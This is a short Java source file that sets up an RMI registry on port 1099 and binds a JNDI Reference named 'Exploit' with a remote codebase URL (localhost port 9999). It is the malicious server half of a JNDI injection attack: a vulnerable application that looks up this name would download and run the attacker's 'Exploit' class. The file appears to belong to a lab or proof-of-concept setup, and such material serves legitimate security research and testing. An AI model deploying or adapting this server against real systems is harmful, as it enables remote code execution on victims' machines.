package com.xiang.rmiServer;

import java.rmi.*;
import javax.naming.*;
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RmiServer {

    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Exploit",
                "Exploit",  "http://127.0.0.1:9999/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);
    }
    
	public static void main(String[] args) throws Exception {
		start();
	}

}
